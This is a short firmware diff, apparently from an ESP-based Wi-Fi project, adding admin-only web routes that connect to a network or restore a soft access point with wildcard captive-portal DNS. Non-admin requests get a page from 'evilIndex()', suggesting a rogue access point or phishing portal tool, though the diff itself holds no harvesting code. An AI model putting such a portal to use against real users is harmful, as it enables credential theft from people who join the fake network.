@@ -98,6 +98,32 @@ void setupWebServer() {
     webServer.send(HTTP_CODE, "text/html", controlPanel());
   });
 
+  webServer.on("/connectnet", HTTP_POST, [&isAdmin]() {
+    if (!isAdmin) {
+      webServer.send(HTTP_CODE, "text/html", evilIndex());
+      return;
+    }
+    String ssid = input("ssid");
+    String pass = input("pass");
+    if (ssid.length() > 0) {
+      connectToNetwork(ssid, pass);
+    }
+    webServer.send(HTTP_CODE, "text/html", controlPanel());
+  });
+
+  webServer.on("/disconnect", HTTP_POST, [&isAdmin]() {
+    if (!isAdmin) {
+      webServer.send(HTTP_CODE, "text/html", evilIndex());
+      return;
+    }
+    WiFi.disconnect();
+    WiFi.mode(WIFI_AP);
+    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
+    WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str());
+    dnsServer.start(DNS_PORT, "*", APIP);
+    webServer.send(HTTP_CODE, "text/html", controlPanel());
+  });
+
   webServer.on("/printer", HTTP_POST, [&isAdmin]() {
     if (!isAdmin) {
       webServer.send(HTTP_CODE, "text/html", evilIndex());
